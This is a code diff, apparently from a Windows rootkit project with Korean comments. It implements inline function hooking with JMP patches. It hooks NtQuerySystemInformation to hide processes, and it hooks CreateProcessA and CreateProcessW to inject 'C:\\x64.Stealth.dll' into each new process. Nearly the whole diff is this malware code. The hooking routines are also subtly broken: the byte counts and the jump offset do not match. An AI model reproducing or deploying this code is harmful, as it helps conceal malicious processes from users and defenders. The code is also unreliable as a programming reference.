@@ -3,16 +3,62 @@
 
 #include "stdafx.h"
 
+BYTE bakBytes_CPA[9] = { 0, };
+BYTE bakBytes_CPW[9] = { 0, };
+BYTE bakBytes_NTQ[9] = { 0, };
 
-
-BOOL enable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName, PROC pfnNew)
+BOOL enable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pBakBytes)
 {
-	
+	FARPROC pFunc;
+	DWORD dwOldProtect, dwAddress;
+	BYTE pBuf[9] = { 0xE9, 0, };
+	PBYTE pByte;
+
+	pFunc = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
+	if (pFunc == NULL)
+		return FALSE;
+	pByte = (PBYTE)pFunc;
+	if (pByte[0] == 0xE9)
+		return FALSE;
+
+	if (VirtualProtect((LPVOID)pFunc, 9, PAGE_EXECUTE_READWRITE, &dwOldProtect) == NULL)
+		return FALSE;
+
+	memcpy(pBakBytes, pFunc, 5);
+
+	dwAddress = (DWORD)pfnNew - (DWORD)pFunc - 9;
+	memcpy(&pBuf[1], &dwAddress, 8);
+
+	memcpy(pFunc, pBuf, 9);
+
+	if (VirtualProtect((LPVOID)pFunc, 9, dwOldProtect, &dwOldProtect) == NULL)
+		return FALSE;
+
+	return TRUE;
 }
 
-BOOL disable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName)
+BOOL disable_code_hooking(LPCTSTR szDllName, LPCSTR szFuncName, PBYTE pBakBytes)
 {
-	
+	FARPROC pFunc;
+	DWORD dwOldProtect;
+	PBYTE pByte;
+
+	pFunc = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
+	if (pFunc == NULL)
+		return FALSE;
+	pByte = (PBYTE)pFunc;
+	if (pByte[0] != 0xE9)
+		return FALSE;
+
+	if (VirtualProtect((LPVOID)pFunc, 9, PAGE_EXECUTE_READWRITE, &dwOldProtect) == NULL)
+		return FALSE;
+
+	memcpy(pFunc, pBakBytes, 9);
+
+	if (VirtualProtect((LPVOID)pFunc, 9, dwOldProtect, &dwOldProtect) == NULL)
+		return FALSE;
+
+	return TRUE;
 }
 
 BOOL Inject(HANDLE hProc, LPCSTR szDllName)
@@ -71,7 +117,7 @@ NTSTATUS NTAPI MyNtQuerySystemInformation(
 	FARPROC pFunc;
 	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
 
-	disable_code_hooking(TEXT("ntdll.dll"), "NtQuerySystemInformation");
+	disable_code_hooking(TEXT("ntdll.dll"), "NtQuerySystemInformation", bakBytes_NTQ);
 	pFunc = GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQuerySystemInformation");
 	if (pFunc == NULL)
 		return FALSE;
@@ -108,7 +154,7 @@ NTSTATUS NTAPI MyNtQuerySystemInformation(
 		}
 	}
 
-	enable_code_hooking(TEXT("ntdll.dll"), "NtQuerySystemInformation", (PROC)MyNtQuerySystemInformation);
+	enable_code_hooking(TEXT("ntdll.dll"), "NtQuerySystemInformation", (PROC)MyNtQuerySystemInformation, bakBytes_NTQ);
 
 	return status;
 }
@@ -129,7 +175,7 @@ BOOL WINAPI MyCreateProcessA(
 	BOOL bRetuen;
 	FARPROC pFunc;
 
-	disable_code_hooking(TEXT("kernel32.dll"), "CreateProcessA");
+	disable_code_hooking(TEXT("kernel32.dll"), "CreateProcessA", bakBytes_CPA);
 
 	pFunc = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateProcessA");
 	if (pFunc == NULL)
@@ -150,9 +196,9 @@ BOOL WINAPI MyCreateProcessA(
 
 	/* dll이름 절대경로로 바꿔주기 */
 	if (bRetuen)
-		Inject(lpProcessInformation->hProcess, "stealth.dll");
+		Inject(lpProcessInformation->hProcess, "C:\\x64.Stealth.dll");
 
-	enable_code_hooking(TEXT("kernel32.dll"), "CreateProcessA", (PROC)MyCreateProcessA);
+	enable_code_hooking(TEXT("kernel32.dll"), "CreateProcessA", (PROC)MyCreateProcessA, bakBytes_CPA);
 
 	return bRetuen;
 }
@@ -173,7 +219,7 @@ BOOL WINAPI MyCreateProcessW(
 	BOOL bRetuen;
 	FARPROC pFunc;
 
-	disable_code_hooking(TEXT("kernel32.dll"), "CreateProcessW");
+	disable_code_hooking(TEXT("kernel32.dll"), "CreateProcessW", bakBytes_CPW);
 
 	pFunc = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateProcessW");
 	if (pFunc == NULL)
@@ -194,9 +240,39 @@ BOOL WINAPI MyCreateProcessW(
 
 	/* dll이름 절대경로로 바꿔주기 */
 	if (bRetuen)
-		Inject(lpProcessInformation->hProcess, "stealth.dll");
+		Inject(lpProcessInformation->hProcess, "C:\\x64.Stealth.dll");
 
-	enable_code_hooking(TEXT("kernel32.dll"), "CreateProcessW", (PROC)MyCreateProcessW);
-
+	enable_code_hooking(TEXT("kernel32.dll"), "CreateProcessW", (PROC)MyCreateProcessW, bakBytes_CPW);
 	return bRetuen;
 }
+
+//int WINAPI MyMessageBoxW(
+//	HWND hWnd,
+//	LPCWSTR lpText,
+//	LPCWSTR lpCaption,
+//	UINT uType
+//	)
+//{
+//	BOOL bRetuen;
+//	FARPROC pFunc;
+//
+//	disable_code_hooking(TEXT("user32.dll"), "MessageBoxW");
+//
+//	pFunc = GetProcAddress(GetModuleHandle(TEXT("user32.dll")), "MessageBoxW");
+//	if (pFunc == NULL)
+//		return FALSE;
+//
+//	bRetuen = ((PFMESSAGEBOXW)pFunc)(
+//		hWnd,
+//		lpText,
+//		lpCaption,
+//		uType
+//		);
+//
+//	///* dll이름 절대경로로 바꿔주기 */
+//	//if (bRetuen)
+//	//	Inject(lpProcessInformation->hProcess, "C:\\x64.Stealth.dll");
+//
+//	enable_code_hooking(TEXT("user32.dll"), "MessageBoxW", (PROC)MyCreateProcessW);
+//	return bRetuen;
+//}
